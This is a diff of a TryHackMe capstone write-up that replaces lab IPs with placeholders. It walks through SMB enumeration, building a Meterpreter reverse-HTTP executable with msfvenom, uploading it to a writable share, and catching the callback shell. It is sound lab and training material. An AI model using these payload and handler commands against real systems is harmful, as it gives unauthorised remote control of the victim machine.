@@ -3,11 +3,22 @@
 
 **Pathway:** *Jr Penetration Tester* | **Section:** *Metasploit and Exploitation* | **Room:** *Metasploit: Payload Generation* | **Task:** *[Capstone Challenge](https://tryhackme.com/room/metasploitpayloadgeneration)*
 
-> **Spoiler warning:** This write-up contains the full exploitation chain, however no flag codes are shown in this write-up!
+> [!IMPORTANT]
+> **Spoiler warning:** This writeup contains part of exploitation chain, however no flag codes are shown in this writeup!
 >
-> **Please note:** The IP addresses shown in this write-up were allocated during the TryHackMe lab, with the attack performed from my own Kali Linux VM using OpenVPN connected to the TryHackMe Paris VPN server.
+> **Please note:** The IP addresses shown in this writeup were allocated during the TryHackMe lab, with the attack performed from my own Kali Linux VM using OpenVPN connected to the TryHackMe VPN.
 >
-> **License:** Unless otherwise stated, all write-ups and documentation in this repository are licensed under [CC BY 4.0](https://creativecommons.org/licenses/by/4.0/). Any original scripts or code snippets are provided under the [MIT Licence](https://opensource.org/license/mit).
+> **License:** Unless otherwise stated, all writeups and documentation in this repository are licensed under [CC BY 4.0](https://creativecommons.org/licenses/by/4.0/). Any original scripts or code snippets are provided under the [MIT Licence](https://opensource.org/license/mit/).
+> 
+> This writeup uses several placeholders to avoid exposing lab-specific or sensitive information:
+>
+> - `<TARGET_IP>` - the IP address assigned to the target host when the TryHackMe machine is started.
+> - `<TUN0_IP>` - the IP address assigned to my Kali Linux VM when connected to the TryHackMe VPN using OpenVPN.
+> - `<REDACTED>` - information intentionally removed from the public writeup, such as flags, credentials, hashes or other challenge-sensitive values.
+>
+> This writeup reflects my own route through the challenge. Other learners may solve the room using different tools, commands or techniques. To preserve the integrity of the challenge and to act responsibly towards TryHackMe and the wider learning community, I choose what to redact from my public writeups unless I am asked by TryHackMe or another appropriate party to redact or remove additional material.
+
+---
 
 ## About TryHackMe
 
@@ -33,8 +44,8 @@ Final compromise chain:
 
 Confirmed lab details used during the demonstration:
 
-    Target IP: 10.130.133.81
-    Kali tun0 IP: 192.168.129.186
+    Target IP: <TARGET_IP>
+    Kali tun0 IP: <TUN0_IP>
     Attacker working directory: /tmp/VK
 
 ## Tools Used
@@ -56,7 +67,7 @@ The first step was to identify the services exposed by the target.
 From the Kali Linux terminal:
 
 ```bash
-nmap -sC -sV -p- 10.130.133.81
+nmap -sC -sV -p- <TARGET_IP>
 ```
 
 The options used were:
@@ -93,7 +104,7 @@ smb2-security-mode:
 The available SMB shares were enumerated without supplying credentials:
 
 ```bash
-smbclient -L //10.130.133.81 -N
+smbclient -L //<TARGET_IP> -N
 ```
 
 The `-N` option suppresses the password prompt and attempts an anonymous or guest session.
@@ -152,13 +163,13 @@ cd /tmp/VK
 The following `msfvenom` command created the executable:
 
 ```bash
-msfvenom -p windows/x64/meterpreter_reverse_http LHOST=192.168.129.186 LPORT=80 -f exe -o payload.exe
+msfvenom -p windows/x64/meterpreter_reverse_http LHOST=<TUN0_IP> LPORT=80 -f exe -o payload.exe
 ```
 
 The command options were:
 
 - `-p windows/x64/meterpreter_reverse_http` selected the stageless 64-bit Windows Meterpreter payload.
-- `LHOST=192.168.129.186` set the callback address to the Kali `tun0` interface.
+- `LHOST=<TUN0_IP>` set the callback address to the Kali `tun0` interface.
 - `LPORT=80` used an outbound HTTP-compatible port.
 - `-f exe` generated a Windows executable.
 - `-o payload.exe` saved the result as `payload.exe`.
@@ -197,7 +208,7 @@ The module can upload through an existing SMB session or connect directly to a r
 The target and share were configured:
 
 ```text
-set RHOSTS 10.130.133.81
+set RHOSTS <TARGET_IP>
 set SMBSHARE public
 ```
 
@@ -251,8 +262,8 @@ run
 Metasploit confirmed that the executable had been uploaded:
 
 ```text
-[+] 10.130.133.81:445 - /tmp/VK/payload.exe uploaded to payload.exe
-[*] 10.130.133.81:445 - Scanned 1 of 1 hosts (100% complete)
+[+] <TARGET_IP>:445 - /tmp/VK/payload.exe uploaded to payload.exe
+[*] <TARGET_IP>:445 - Scanned 1 of 1 hosts (100% complete)
 [*] Auxiliary module execution completed
 ```
 
@@ -272,7 +283,7 @@ The handler had to match the payload type and callback settings used by `msfveno
 
 ```text
 set PAYLOAD windows/x64/meterpreter_reverse_http
-set LHOST 192.168.129.186
+set LHOST <TUN0_IP>
 set LPORT 80
 ```
 
@@ -285,7 +296,7 @@ run
 Metasploit reported:
 
 ```text
-[*] Started HTTP reverse handler on http://192.168.129.186:80
+[*] Started HTTP reverse handler on http://<TUN0_IP>:80
 ```
 
 Matching the handler to the generated payload is essential. A staged handler cannot reliably handle a stageless payload when the payload types do not correspond.
@@ -297,7 +308,7 @@ After the scheduled task executed the uploaded payload, the target connected to 
 Relevant output included:
 
 ```text
-[*] http://192.168.129.186:80 handling request from 10.130.133.81
+[*] http://<TUN0_IP>:80 handling request from <TARGET_IP>
 [*] Attaching orphaned/stageless session...
 [*] Meterpreter session 1 opened
 ```
@@ -305,7 +316,7 @@ Relevant output included:
 The session connected from the target to Kali:
 
 ```text
-192.168.129.186:80 -> 10.130.133.81:<ephemeral-port>
+<TUN0_IP>:80 -> <TARGET_IP>:<ephemeral-port>
 ```
 
 The prompt changed to:
@@ -474,16 +485,16 @@ The primary design failure was not simply that a share was writable. The critica
 
 ## Disclaimer
 
-This write-up is intended solely for education, training and documentation of an authorised TryHackMe lab.
+This writeup is intended solely for education, training and documentation of an authorised TryHackMe lab.
 
 All tools, commands, payloads and post-exploitation techniques described here were used within a controlled environment provided by TryHackMe. Permission to interact with the target was granted by the platform owner and operator as part of the room.
 
-The tools and methods documented in this demonstration represent one successful approach. They are not the only possible techniques, and alternative tools or workflows may produce the same result.
+The tools and methods documented in this walkthrough represent one successful approach. They are not the only possible techniques, and alternative tools or workflows may produce the same result.
 
 Never test, scan, exploit or access a system without clear and explicit authorisation from its owner.
 
 ---
 [!["Buy Me A Coffee"](https://www.buymeacoffee.com/assets/img/custom_images/orange_img.png)](https://buymeacoffee.com/v4l1k4hn)  
 
-**Powered on ☕ made with ❤️ by [Valikahn](https://github.com/Valikahn)**  
+**Powered on ☕ made with ❤️ by [V4L1K4HN](https://tryhackme.com/p/V4L1K4HN)**  
 ⭐ If this project is useful, consider starring it on GitHub.
